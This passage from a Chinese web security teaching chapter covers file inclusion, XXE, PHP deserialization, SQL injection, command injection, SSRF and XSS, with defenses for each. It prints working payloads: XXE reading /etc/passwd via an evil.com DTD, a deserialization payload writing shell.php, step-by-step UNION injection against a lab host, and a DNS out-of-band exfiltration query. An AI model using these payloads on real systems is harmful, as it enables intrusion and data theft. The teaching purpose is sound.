- 口令安全策略加强。例如，要求用户设置的口令具备一定复杂度，使用第三方 API 检查用户设置的口令是否存在于已知的口令泄漏事件所涉及数据库表中；
- 启用双因素认证。CAPTCHA（Completely Automated Public Turing test to tell Computers and Humans Apart）验证、Google 身份验证器、用户注册邮箱验证码、用户注册短信验证码等均是常见的双因素认证手段，用于辅助加强基于用户名和口令方式身份认证的不足之处。
- 启用账号风险监控识别和锁定机制。最基本的账号风险监控就是统计账号在短时间内的错误登录尝试次数，并在达到特定阈值时禁止账号继续身份认证尝试一段时间或启用双因素认证。更复杂的账号风险监控包括异地登录识别、异常设备登录识别、异常登录环境识别等等。
### 文件包含
很多程序为了实现插件效果，会允许程序在运行时通过变量赋值的方式来动态包含其他源代码文件。如果攻击者能够控制文件包含`变量的赋值`就意味着程序会加载由攻击者控制的恶意文件并执行其中的恶意代码，这就完成了`文件包含`漏洞的触发。 PHP 语言由于其过于灵活和自由的代码执行机制导致了大多数文件包含类漏洞都是出现在 PHP 编写的网站程序之中。

PHP 中常见的文件包含函数有 include()、require()、include_once()和require_once()，根据传入参数变量指向的文件是服务器上本地文件还是远程主机上的文件，PHP 的文件包含漏洞可以被分为本地文件包含和远程文件包含两种漏洞利用方式。
> 注意的是，PHP 对于被包含的文件，只要内容符合 PHP 语法规范，不管扩展名是什么都能被 PHP 解析执行。若文件内容不符合 PHP 语法规范则会直接输出被包含文件的内容，包含不存在的文件则可能暴露文件的绝对路径。

以下是一段存在文件包含漏洞的 PHP 代码示例:
```PHP
<?php
if (@$_GET['page']) {
    include($_GET['page']);
} else {
    include "./action/show.php";
}
```
1. 远程文件包含执行 PHP 代码。PHP 7.2.6 的默认运行时配置（php.ini）是禁止包含远程文件的，如下图所示是一次失败的远程文件包含漏洞利用行为尝试。

如下图所示则是修改了 `php.ini`，设置 `allow_url_include=On` 之后再次执行得到的成功效果截图。
![远程文件包含缺陷演示](../images/chapter_7_igbag/php-include-remote-1.png)
其中，被包含的远程文件 remote.php 代码如下：
```php
<?php
phpinfo();
```
需要注意的是，除了 allow_url_include=On 远程文件包含漏洞利用的依赖配置之外，还依赖于 allow_url_fopen=On。

2. 本地文件包含读取任意文件内容的利用效果如下图所示：  

![本地文件包含读取文件](../images/chapter_7_igbag/php-include-local-1.png)

3. 本地文件包含执行 PHP 代码。
    - 不依赖于修改 PHP 的默认运行时配置即可完成任意 PHP 代码执行
    - 但相比较于远程文件包含方式，本地文件包含漏洞的利用往往需要配合 文件上传 漏洞利用才能达成目的
    - 攻击者需要先上传包含 PHP 代码的文件到服务器上，然后还需要知道已上传文件存储在服务器上的路径（绝对路径或相对当前脚本执行环境的相对路径）
    - 进而通过控制文件包含参数的赋值来加载刚刚上传的恶意文件中的 PHP 代码

4. 利用 `php://input`。  

[php://input](https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.input) 是个可以访问请求的原始数据的只读流。  
在使用 POST 方式请求时，HTTP 请求体中的数据会赋值给 HTTP 请求头中对应 GET 变量值为 `php://input` 的变量。

如下图所示，使用 curl 构造了一个这样的请求，其中 HTTP 请求体中对应的是一段 PHP 代码：在当前脚本目录下执行操作系统 ls 命令。

![利用php://input](../images/chapter_7_igbag/php-include-php-input-0.png)
注意这种漏洞利用方式，同样依赖于 PHP 的运行时配置 `allow_url_include=On`，否则漏洞利用会失败

5.  利用 [data://](https://www.php.net/manual/zh/wrappers.data.php)。

除了上述几种文件包含漏洞的利用方式，在实践中还有利用 [php://filter](https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.filter)、`PHP %00` 截断漏洞等方式实现文件包含漏洞的利用。

防御 PHP 文件包含漏洞
- 修改 PHP 的运行时配置文件 php.ini
    - 开启 open_basedir 函数，将其设置为指定目录，则只有该目录的文件允许被访问
    - allow_url_include=Off 禁止远程文件包含
    - 从代码级别避免和修复文件包含漏洞
        - 过滤文件包含路径变量的输入，采用白名单方式包含文件
        - 建议禁止从程序外部输入读取包含文件的路径

### XXE 注入
XXE 的全称是 XML External Entity（XML 外部实体） 。  

如果 XML 解析器未净化并验证外部提供的 XML 输入，那么负责解析 XML 的应用程序就会面临着注入攻击的风险。  
此类注入攻击可能导致敏感数据泄露、拒绝服务攻击、服务器端请求伪造、远程代码执行，甚至被用于执行应用程序托管服务器的网络端口扫描。  
以下 2 个 XML 片段均包含 XXE 攻击代码，分别对应直接读取本地文件和加载执行远程 DTD 文件中的 XML 代码读取本地文件。
```xml
<!-- 利用外部 DTD，读取系统文件 /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<a>
        <!-- 读取到的 /etc/passwd 文件内容被保存在 passwd 变量中 -->
        <value>&passwd;</value>
</a>
<!-- 参数实体定义 -->
<?xml version="1.0" encoding="utf-8"?>
```
```xml
<!DOCTYPE aaa [
    <!ENTITY %f SYSTEM "http://evil.com/evil.dtd">
    %f;
]>
<aaa>&b;</aaa>

<!-- 其中 evil.dtd 文件内容如下 -->
<!ENTITY b SYSTEM "file:///etc/passwd">
```
以 PHP 的内置 DOM 解析 XML 为例，一个典型的存在 XXE 漏洞的代码如下：
```php
<?php
$xml = file_get_contents('php://input'); // 允许用户上传 XML 代码片段

$dom = new DOMDocument();

// ref: http://php.net/manual/zh/libxml.constants.php
// LIBXML_NOENT    将 XML 中的实体引用 替换 成对应的值
// LIBXML_DTDLOAD  加载 DOCTYPE 中的 DTD 文件
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // http://php.net/manual/zh/domdocument.loadxml.php
$user = simplexml_import_dom($dom);
$name = $user->name;
$pass = $user->pass;

echo "You have logged in as user $name";
```
正常情况下用户发送过来的数据如下：  
```xml
<!-- xxe-normal-data.xml -->
<user>
    <name>admin</name>
    <pass>mypass</pass>
</user>
```
客户端访问 `curl -s -H "Content-Type: text/xml" -X POST 127.0.0.1:9090/test.php --data-binary "@xxe-normal-data.xml" `  
显示为：`You have logged in as user admin`

此时，上述 PHP 代码可以正常处理解析用户数据并回显当前登录用户名称。但如果攻击者构造如下数据发送给上述 PHP 代码：`curl -s -H "Content-Type: text/xml" -X POST 127.0.0.1:9090/test.php --data-binary "@xxe-exp-payload.xml" `  
```xml
<!-- xxe-exp-payload.xml -->
<!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name><pass>mypass</pass></user>
```
则会回显输出服务器上 `/etc/passwd` 文件内容，攻击者达成了远程文件读取的攻击效果。

对于上述缺陷 PHP 代码来说，修改 `loadXML()` 的调用参数，去掉 `LIBXML_NOENT` 和 `LIBXML_DTDLOAD` 常量赋值即可阻止 `XXE` 漏洞利用成功。

推荐训练学习资源 
- [PHP XXE 漏洞与利用源代码分析示例](https://github.com/vulnspy/phpaudit-XXE)
- [vulhub 提供的 XXE 漏洞学习训练环境](https://github.com/vulhub/vulhub/tree/master/php/php_xxe)

[Python XML 解析器其他漏洞类型](https://docs.python.org/3/library/xml.html#xml-vulnerabilities)
|kind|sax|etree|minidom|pulldom|xmlrpc|
|:--|:--|:--|:--|:--|:--|
|billion laughs|易受攻击|易受攻击|易受攻击|易受攻击|易受攻击|
|quadratic blowup|易受攻击|易受攻击|易受攻击|易受攻击|易受攻击|
|external entity expansion|安全 (4)|安全 (1)|安全 (2)|安全 (4)|安全 (3)|
|DTD retrieval|安全 (4)|安全|安全|安全 (4)|安全|
|decompression bomb|安全|安全|安全|安全|易受攻击|

1. xml.etree.ElementTree 不会扩展外部实体并在实体发生时引发 ParserError。
2. xml.dom.minidom 不会扩展外部实体，只是简单地返回未扩展的实体。
3. xmlrpclib 不扩展外部实体并省略它们。
4. 从 Python 3.7.1 开始， 默认情况 下不再处理外部通用实体。

训练学习资源
- [python-xxe](https://github.com/c4pr1c3/python-xxe)
- [一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)
### 反序列化漏洞
- 序列化是将 `应用程序对象` 状态转换为 `二进制数据或文本数据` 的过程
- 反序列化则是其逆向过程，即从 `二进制数据或文本数据` 创建对象状态
> 应用程序使用该功能来支持有效 共享或存储 对象状态

- 攻击者通过 `创建恶意的反序列化对象` ，在应用程序执行序列化时远程执行代码和篡改数据
- 使用不可信来源的对象序列化的分布式应用程序和 API 特别容易受到反序列化攻击
#### PHP 对象序列化基本概念
[PHP 官方文档中摘录如下](https://www.php.net/manual/zh/language.oop5.serialization.php)  
所有php里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是 不会保存对象的方法，只会保存类的名字。

PHP 的对象序列化过程：
```php
<?php
class User {
    private $mobile;
    protected $age;
    public $name;

    public function say() {
        echo "My name is $this->name\n";
    }

    public function __construct($age = NULL, $name = NULL, $mobile = NULL) {
        echo "__construct is called\n";
        $this->age = $age;
        $this->name = $name;
        $this->mobile = $mobile;
    }

    public function __toString() {
        return "$this->name is $this->age old\n";
    }

    public function __sleep() {     // 序列化时调用
        echo "__sleep is called\n";
        return array('age', 'name', 'mobile');
    }

    public function __wakeup() {    // 反序列化时调用
        echo "__wakeup is called\n";
    }

    public function __destruct() {  // 销毁后执行
        echo "__destruct is called on $this->name \n";
    }
}

$user = new User(22, "Zhang San", "13800138000"); // 对象创建时自动触发 __construct()
echo $user; // $user 对象被当做「字符串」访问，自动触发 __toString()

// 序列化
$s_user = serialize($user); // 序列化时自动触发 __sleep() 方法
file_put_contents("/tmp/ser.bin", $s_user); // 序列化结果写入文件方便查看输出结果里的「不可打印」字符
echo $s_user . "\n"; // 打印序列化结果
system("hexdump -C /tmp/ser.bin"); // 16 进制方式查看「序列化结果」

// 反序列化
$r_user = unserialize(file_get_contents("/tmp/ser.bin")); // 反序列化时触发 __wakeup() 方法
$r_user->name = "Li Si";
echo $r_user; // 被 echo 时触发「字符串」转换魔术方法 __toString
$r_user->say(); // 调用「恢复出来的对象」的方法

// 序列化过程结束
printf("EOF reached\n");

// 全部脚本执行完毕，自动触发 $user 对象的 __destruct()
// 注意对象销毁的顺序和对象的创建顺序是相反的
// 栈操作顺序：先创建，后销毁

// 执行结果如下
/*
__construct is called
Zhang San is 22 old
__sleep is called
O:4:"User":3:{s:6:"*age";i:22;s:4:"name";s:9:"Zhang San";s:12:"Usermobile";s:11:"13800138000";}
00000000  4f 3a 34 3a 22 55 73 65  72 22 3a 33 3a 7b 73 3a  |O:4:"User":3:{s:|
00000010  36 3a 22 00 2a 00 61 67  65 22 3b 69 3a 32 32 3b  |6:".*.age";i:22;|
00000020  73 3a 34 3a 22 6e 61 6d  65 22 3b 73 3a 39 3a 22  |s:4:"name";s:9:"|
00000030  5a 68 61 6e 67 20 53 61  6e 22 3b 73 3a 31 32 3a  |Zhang San";s:12:|
00000040  22 00 55 73 65 72 00 6d  6f 62 69 6c 65 22 3b 73  |".User.mobile";s|
00000050  3a 31 31 3a 22 31 33 38  30 30 31 33 38 30 30 30  |:11:"13800138000|
00000060  22 3b 7d                                          |";}|
00000063
__wakeup is called
Li Si is 22 old
My name is Li Si
EOF reached
__destruct is called on Li Si
__destruct is called on Zhang San
*/
```
看上去 User 对象经过「序列化」（调用 serialize() 函数）之后变成了以下「字符串」：  
`O:4:"User":3:{s:6:"*age";i:22;s:4:"name";s:9:"Zhang San";s:12:"Usermobile";s:11:"13800138000";}`

- `protected` 属性字段 `age` 左边的 `*` (2a) 字符的左右两边被不可打印字符 `\00` 包围
- `private` 属性字段 `mobile` 左边拼接了字符串 `\00User\00` 其中 `User` 是类名

「序列化」规律：
- <对象标识>:<类名长度>:"类名":类的成员变量个数:{
    - `O:4:"User":3:{`
- <成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值>;
    - `s:6:"\00*\00age";i:22;`
- <成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值长度>:<成员变量值>;
    - `s:4:"name";s:9:"Zhang San";`
- <成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值长度>:<成员变量值>;}
    - `s:12:"\00User\00mobile";s:11:""13800138000";}`

#### 漏洞示例
漏洞代码：
```php
<?php
class cuc {
    var $test = 'whatever';
    function __wakeup() {
        $fp = fopen("shell.php", "w");
        fwrite($fp, $this->test);
        fclose($fp);
        echo '__wakeup';
    }
}

$class = $_GET['test'];
unserialize($class);
```
构造漏洞利用的关键负载
```php
<?php
class cuc {
    var $test = 'whatever';
    function __wakeup() {
        $fp = fopen("shell.php", "w");
        fwrite($fp, $this->test);
        fclose($fp);
        echo '__wakeup';
    }
}
$payload_class = new cuc();
$payload_class->test = "<?php phpinfo(); ?>";
$payload = serialize($payload_class);
print(urlencode($payload)); // urlencode() 结果是为了方便使用 curl 时给 GET 参数赋值
```
通过传入：  
`curl http://127.0.0.1:8000/ser-2.php?test=$(php ser-2-exp.php)`  
或者  
`curl http://127.0.0.1:8888/serialize_vul.php\?test\=O%3A3%3A%22cuc%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D`

成功执行上述反序列化漏洞利用代码之后，会在当前脚本目录下创建的 `shell.php` 中写入 PHP 代码：`<?php phpinfo(); ?>`。由此可见，当传给 `unserialize()` 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。

#### 反序列化漏洞的防御方案
- 将应用程序配置为不接受不可信来源的任何反序列化输入
- 仅使用具有基本数据类型的序列化函数（如 PHP 的 json_encode() 和 json_decode()）
- 如果这些措施不可行，那么在创建对象之前执行反序列化期间应强制实施约束类型，在较低特权环境（例如，临时容器）中运行反序列化，并限制与执行反序列化的服务器的网络连接
- 同时还可通过使用加密或完整性检查（例如，数字签名），防止恶意的对象创建和数据篡改操

## 后台相关漏洞
### SQL 注入
数据库把用户输入的数据全部或部分的当作 SQL 指令执行了。  
之所以会出现数据库错误的把用户输入的数据当作 SQL 指令去执行，从代码层面来看正是因为涉及到 SQL 指令构建和执行的语句中存在可以被用户输入控制的变量。  

推荐训练学习资源  
- [sqli-labs](https://github.com/c4pr1c3/sqli-labs) | [sqli-labs 国内 gitee 镜像](https://gitee.com/c4pr1c3/sqli-labs)
- [MySQL 手册](https://dev.mysql.com/doc/refman/8.0/en/sql-data-manipulation-statements.html)

#### 经典的登录绕过漏洞
sqli-labs 里的 Lesson-11 Post - Error Based - Single quotes - String

缺陷代码:
```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```
```sql
/* 正常登录过程 */
SELECT username, password FROM users WHERE username='admin' and password='admin' LIMIT 0,1
/* SQL 注入登录过程 */
-- 用户名字段输入随意，例如 1 密码字段输入 1' or 1 -- （注意 -- 左右两边各有一个空格）
SELECT username, password FROM users WHERE username='admin' and password='1' or 1 -- ' LIMIT 0,1
-- 用户名字段输入 admin' --  （注意 -- 左右两边各有一个空格）密码字段输入随意
SELECT username, password FROM users WHERE username='admin' -- ' and password='1' LIMIT 0,1
```
#### SQL 注入漏洞发现与利用的一般步骤
- 确认漏洞注入点存在
    - 有报错回显
        - 枚举/猜解：列数 –> 数据库版本 –> 表名 –> 列名 –> 具体值
    - 无报错回显 –> SQL 盲注
        - 利用 SQL 代码延迟执行时间差
        - 利用 SQL 代码执行返回结果差异制造页面渲染结果差别

```php
# 1. 判断注入点是否存在

http://192.168.56.144:7080/Less-2/?id=2'

# 2. 枚举字段数

http://192.168.56.144:7080/Less-2/?id=2 order by 1
http://192.168.56.144:7080/Less-2/?id=2 order by 2
http://192.168.56.144:7080/Less-2/?id=2 order by 3
# 4 时报错，说明当前查询对应的结果集数量（如果是单表查询则说明当前表的列数）为 3
http://192.168.56.144:7080/Less-2/?id=2 order by 4

# 3. 检查是否支持 union 查询
# 第一次页面返回结果无变化
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,2,3 -- 
# 第二次页面返回结果原先 name 字段显示 2 password 字段显示 3
# 说明返回结果集合的第2和第3个字段值分别对应在这 2 个位置上回显输出
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,2,3 limit 1,1 -- 

# 4. 获取数据库版本信息、数据库连接权限和当前数据库实例名
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(version(),0x3a,user(),0x3a,database()),3 limit 1,1 -- 

# 5. 获取表名
# mysql < 5 只能靠字典爆破方式获取表名和列名
# mysql >= 5 可以通过查询系统库 information_schema 获取
# 以下逐一枚举系统中所有表名
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,table_name,3 from information_schema.tables where table_schema='security' limit 1,1 -- 
...
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,table_name,3 from information_schema.tables where table_schema='security' limit 4,1 -- 

# 6. 查询列名
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name='users'  limit 1,1 -- 
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name='users' limit 2,1 -- 
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,column_name,3 from information_schema.columns where table_name='users' limit 3,1 -- 

# 7. 获取表内数据
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(id,0x3a,username,0x3a,password),3 from users limit 1,1 -- 
http://192.168.56.144:7080/Less-2/?id=2 union all select 1,concat(id,0x3a,username,0x3a,password),3 from users limit 2,1 -- 
```
SQL 注入的众多经验总结形成了诸如 `sqlmap` 这样的全自动化漏洞利用工具，通过研究 `sqlmap` 的源代码或通过自己搭建靶场环境抓包分析 `sqlmap` 产生的流量数据的方式可以很好的学习 SQL 注入的各种方法和技巧。但万变不离其宗：  
找到构成 SQL 语句的外部输入可控变量并篡改为可执行的 SQL 指令，这就是 SQL 注入成功的关键。  
由于 SQL 注入实际攻击的是数据库，所以在实际手工测试 SQL 注入时，手边准备好目标数据库的 SQL 指令手册并搭建相应版本的数据库并建立起一些数据表供测试 SQL 注入代码的有效性是一种常见的工作方式。
#### SQL 注入信息收集
SQL 包含的函数与全局变量
- 数据库版本: `version()`
- 数据库的名字: `database()`
- 数据库用户: `user()`
- 操作系统: `@@version_compile_os`

在 MYSQL 5.0 以上版本中，mysql 存在一个自带数据库名为 `information_schema` ，它是一个存储记录有所有数据库名、表名、列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。

- information_schema.tables:记录所有表名信息的表
- information_schema.columms:记录所有列名信息的表
- table_name: 表名
- column_name: 列名

eg.
查询指定数据库名下的表名信息:
`select * from id=-1 union select 1,tabls_name,3 from information_schema.tables where = table_name`
#### SQL 注入攻击的防御
- 代码级别 `一劳永逸` 修复
    - 使用 [预编译](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#:~:text=This%20coding%20style%20allows%20the,are%20inserted%20by%20an%20attacker.) SQL 语句
- 纵深防御措施
    - 最小化数据库连接权限
    - 输入数据白名单
- 缓解措施
    - 使用 Web 应用防火墙 （WAF）

在代码级别修复 SQL 注入漏洞已经非常成熟，以上述 PHP 代码为例，只需要将 SQL 语句拼接代码修改为采用预编译方式即可彻底杜绝 SQL 注入
```php
<?php
// 省略未修改代码
    $sql = "SELECT id, name FROM users where name=? and password=?";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$name, $password]);
    $user = $stmt->fetchAll();
```
对于 PHP 来说，从 [PHP 5.5.0 起 mysql_ 系列函数均已经被废弃，并且从 PHP 7.0.0 开始被移除](https://www.php.net/manual/zh/intro.mysql.php)，官方建议可以使用 [mysqli](https://www.php.net/manual/zh/book.mysqli.php) 或者 [PDO_MySQL](https://www.php.net/manual/zh/ref.pdo-mysql.php) 扩展代替。而上述例子中，虽然使用了安全的数据库扩展，但只要依然在使用 SQL 字符串拼接方式来构建 SQL 语句执行就依然有可能留下 SQL 注入漏洞。

#### [SQL 内容补充](../opt/SQL_injection_st.md)
### 命令注入
SQL 注入本身就是一种特殊的 `命令注入`：针对 SQL 服务器的命令注入。

命令注入根据命令或代码执行环境的区别，主要分为：  
**脚本代码注入**、**操作系统命令注入**和**表达式注入**。

#### 脚本代码注入
大部分脚本语言都存在类似 `eval()` 的执行脚本语言自身代码的函数或方法。以下是一段存在 PHP 代码注入漏洞的 PHP 代码：
```php
<?php
$myvar = "varname";
$x = $_GET['arg'];
$cmd = "\$myvar = " . $x .";";
eval($cmd);
```
可以通过构造请求参数 `arg=1; phpinfo()` 完成 PHP 代码注入。   
`文件包含` 漏洞从机理上来说也可以属于这里的命令注入，攻击数据都是被脚本引擎解释执行。
#### 操作系统命令注入
当攻击数据是被当作操作系统命令执行时，我们称之为操作系统命令注入漏洞。  

以 PHP 为例，可以通过调用 [system()](http://php.net/manual/zh/function.system.php) 、[passthru](http://php.net/manual/zh/function.passthru.php) 或 [exec](http://php.net/manual/zh/function.exec.php) 等函数来将用户传入的数据当作外部程序（操作系统命令）执行。以下是一段存在操作系统命令注入漏洞的 PHP 代码：
```php
<?php
$cmd = "cat welcome/users/" . $_GET['id'] . ".html";
$welcome_msg = passthru($cmd, $return_var);
if($return_var === 0) {
    echo $welcome_msg;
} else {
    echo "Welcome, Guest!";
}
```
可以通过构造请求参数 `1.html; id; echo` 完成操作系统命令注入。  

从代码级别修复上述操作系统命令注入漏洞的方法是使用 `escapeshellarg()` 过滤 `$_GET['id']` 的值，该函数将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。shell 函数包含 exec(), system()，执行运算符（反引号 \） 。

需要注意的是，PHP 中还有另一个类似的针对操作系统命令注入的过滤函数 [escapeshellcmd](http://php.net/manual/zh/function.escapeshellcmd.php) 。  
两个函数的区别是：  
`escapeshellcmd()` 被用在完整的命令字符串上  
`escapeshellarg()` 对单个参数进行转义
> 注意：[这 2 个函数不能同时使用](https://paper.seebug.org/164/)
#### 表达式注入漏洞
- [公开资料可以找到的最早讨论表达式注入漏洞的文章是 2011 年 Stefano 和 Arshan 联合发表的Expression Language Injection](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)
    - Spring MVC 框架中 Spring MVC JSP 标签可以执行 Java 代码
    - 涉及到的表达式语言引擎包括：Struts 2 的 OGNL，Spring 的 SPEL 等
- Apache Struts 2 的 [S2-014](https://cwiki.apache.org/confluence/display/WW/S2-014) 就是一个典型的表达式注入漏洞，官方漏洞危害评级为：高危
- 另一个知名的 Java 企业级 Web 开发流行框架 Spring 在历史上同样爆出过表达式注入漏洞
- 例如 [CVE-2016-4977](https://nvd.nist.gov/vuln/detail/CVE-2016-4977)、[CVE-2017-4971](https://nvd.nist.gov/vuln/detail/CVE-2017-4971)、[CVE-2018-1270](https://nvd.nist.gov/vuln/detail/CVE-2018-1270)和[CVE-2018-1273](https://nvd.nist.gov/vuln/detail/CVE-2018-1273)

截止目前，表达式注入漏洞均发生在 Java 程序之中，未来其他的 Web 开发技术也有可能出现这种类似的表达式存在，有鉴于已有的这些表达式漏洞的危害巨大。  
届时，表达式注入漏洞可能将成为 Web 应用程序漏洞挖掘的一个重要方向。
### 服务端请求伪造
服务端请求伪造（Server Side Request Foregery, SSRF）是一种由攻击者构造形成由服务器端发起请求的一个漏洞。

- `文件包含`、`XXE 注入`、`反序列化漏洞` 都可以被用来构造和触发 `SSRF`
    - 这就是典型的「组合漏洞」和「链式漏洞利用」
- 严格来说，SSRF 不是一种独立 *漏洞类型* ，而是一种 *漏洞利用类型*

一段 SSRF 风险代码
```PHP
<?php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}
$url = $_GET['url'];
curl($url);
```
由于 curl 支持的协议类型非常广泛（根据官网描述可知有不下 20 种网络协议均可以通过 curl 访问读取），因此上述漏洞代码可以访问诸如：服务器上本地文件（利用 file://）和远程 Web 服务器上的文件（利用 http:// 和 https://）等等。

- 除了文件读取时容易造成 SSRF 漏洞（例如文档、图片、音视频处理等在接受文件路径输入参数时很可能同时支持本地和网络协议 URL）
- 数据库的一些内置功能（加载网络地址时会自动对其中包含的域名字段进行 DNS 查询）也会被利用在 SQL 注入的过程中获取数据

#### SQL 注入过程中的 SSRF
以 sqlmap 为例，在其众多数据获取技巧中提供了一个命令行参数 `--dns-domain` 就是实现了利用 SQL 数据库在执行一些特定函数时会对其中传入的参数当作域名进行查询这个特性的 **基于 DNS 的带外数据回传**

攻击者通过一系列精心构造的域名查询记录就可以拼接还原出从数据库表中读取的数据。攻击者除了可以自己搭建 DNS 服务器来捕获这些 DNS 查询数据之外，还可以使用一些开放的 DNS 查询监控服务，例如 [dnsbin.zhack.ca](http://dnsbin.zhack.ca/) 。以 MySQL 为例，以下是一个典型的使用 `基于 DNS 的带外数据回传` 技术的 SQL 注入代码片段在数据库中得到执行时的完整形态。
```PHP
select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.txt'));
```
成功执行上述 SQL 代码将会在 dnsbin 的 DNS 解析服务器上留下一条 DNS 查询记录

需要注意的是，MySQL 的全局配置参数 [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) 的设定会影响到 `load_file()` 是否解析参数中包含的域名。在从 MySQL 官网下载的 5.7.16 之前独立安装包版本或 5.7.5 之前所有版本的 `secure_file_priv` 缺省设置均为空，则上述攻击代码能得手。但如果设置为 NULL 则会禁用文件读取操作，如果设置为指定目录，则只能从指定目录读取文件。

SSRF 漏洞既可以发生在服务器端脚本所在的主机，也可能发生在后台服务（如上文中举例的数据库）主机。  
SSRF 漏洞一旦被利用可以被用来进行内网服务发现和扫描、作为跳板攻击内网或本地应用程序和 Web 应用等，甚至是任意读取 SSRF 漏洞触发所在主机上的本地文件。  
防御 SSRF 漏洞的基本方法除了输入相关的通用漏洞防御方法之外，对于重要的后台服务启用身份认证和二次鉴权可以有效的缓解 SSRF 的漏洞利用效果。
## 输出相关漏洞
### 跨站点脚本
跨站点脚本（Cross-Site Scripting，XSS）的简写没有采用 `CSS` 是为了避免和另一个术语 `层叠样式表`（Cascading Style Sheet） 产生歧义。

#### 反射型 XSS
```php
<?php
$msg = $_GET['msg'];
// 用户提交的消息被作为关键字提交到后台进行信息检索
// 页面同时把用户输入的搜索关键词展示出来
echo "<div>$msg</div>";
```
上述代码逻辑非常简单，当用户提交“检索消息”给网站后，网站展示搜索结果时「原样输出」用户的搜索关键词。    
如果用户搜索内容是 `<img src=1 onerror=alert(1)>` PHP 输出给浏览器的内容就将变为：`<div><img src=1 onerror=alert(1)></div>`，这段 HTML 代码被浏览器解释执行的结果就是执行了其中包含的 `JavaScript` 代码。这就是一个最基本的 XSS 漏洞利用

反射型 XSS 只是简单地把用户输入的数据“反射”给浏览器。也就是说，攻击者往往需要诱骗用户“点击”一个恶意链接，链接中包含 XSS 代码，才能攻击成功。反射型 XSS 也被称为“非持久型 XSS”。

#### 存储型 XSS 
存储型 XSS 会把用户输入的数据“存储”在服务器或客户端（例如：Cookie、LocalStorage、Web SQL等）。  
“存储”在服务器上的 XSS 代码具有很强的利用稳定性。  
存储型 XSS 也被称为 持久型 XSS。

一个典型场景就是攻击者写下一篇包含 XSS 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行 XSS 中包含的恶意脚本代码。  

基于客户端的存储型 XSS 是伴随着 HTML 5 技术的普及而发展起来的，HTML5 提供了两种新的本地存储方案，sessionStorage 和 localStorage，统称 WebStorage。  
相比较于主流浏览器的 Cookie 存储数据上限容量为 4 KB，利用 localStorage 可以存储高达 5 MB 的数据。  
将 XSS 持久化存储在客户端虽然不及存储在服务器上稳定性高（用户一旦清空浏览器本地缓存就会删除 localStorage 和 cookie 等客户端存储中的所有数据），但和服务端存储型 XSS 一样：只要用户再次打开存在 XSS 漏洞的网站，攻击者预留在这个网站的 XSS 漏洞都可以被自动载入执行。
#### 基于文档对象模型的 XSS（DOM Based XSS）
从漏洞触发原理上来看，DOM Based XSS 的整个漏洞利用过程可以完全不依赖于服务器端脚本的「输出」操作，通过修改页面的 DOM 节点形成 XSS。随着客户端存储型 XSS的出现，利用客户端存储技术也可以实现 DOM Based XSS。不变的是依然不需要依赖于服务端脚本「输出」操作和都会篡改 DOM，变化的只是 XSS 的来源不再是反射方式，也可以是持久化存储方式了。  

下面的代码把前一个包含反射型 XSS 漏洞的 PHP 代码稍加改动，变形为 DOM Based XSS 漏洞：
```php
<?php
$msg = $_GET["msg"];
?>
<input id="dom-xss-src" type="text" value="<?php echo $msg;?>" />
<div id="dom-xss-sink"></div>
<script type="text/javascript">
var src = document.getElementById("dom-xss-src");
var sink = document.getElementById("dom-xss-sink");
sink.innerHTML = src.value;
</script>
```
从上述代码相比较于反射型 XSS 代码的改动可以看出，XSS 代码从原先的：`直接从客户端获取后「原样输出」导致 JavaScript 代码执行`，变为了：`直接从客户端获取到的用户提交查询参数先输入到了一个 <input> 标签内，然后经由一段 JavaScript 代码输出到一个 <div> 的过程中触发了 JavaScript 代码执行`。

#### 防御 XSS
- 服务端脚本在「输出」数据时，要进行「转义」操作
- 「输出」数据的「转义」要按内容是 HTML 还是 JavaScript 进行区别操作，以下以 PHP 代码为例说明具体操作注意事项：
    - 对于 HTML 的输出转义应使用 `htmlspecialchar()` 函数（且大多数情况下应在第二个参数设置 ENT_QUOTES 来转义单引号）
